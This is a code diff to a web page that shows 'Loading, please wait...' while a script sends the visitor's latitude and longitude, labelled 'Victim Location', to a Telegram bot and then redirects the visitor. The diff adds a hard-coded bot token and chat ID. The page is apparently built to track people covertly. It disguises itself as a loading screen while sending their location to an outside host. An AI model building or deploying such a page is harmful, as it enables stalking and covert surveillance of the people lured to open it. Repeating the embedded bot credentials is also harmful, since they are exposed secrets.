@@ -9,10 +9,10 @@
 
     function sendLocation(lat, lon) {
       const msg = 📍 Victim Location:\\nLat: ${lat}\\nLon: ${lon};
-      fetch(https://api.telegram.org/bot${TOKEN}/sendMessage, {
+      fetch(https://api.telegram.org/bot${8357641804:AAHj4VXU4lTjwxnwHC2lKiF60riElxYVWc0}/sendMessage, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        body: JSON.stringify({ chat_id: 1796857790, text: msg })
       }).finally(() => {
         window.location.href = REDIRECT_URL;
       });
@@ -33,4 +33,5 @@
 <body>
   <p>Loading, please wait...</p>
 </body>
+
 </html>
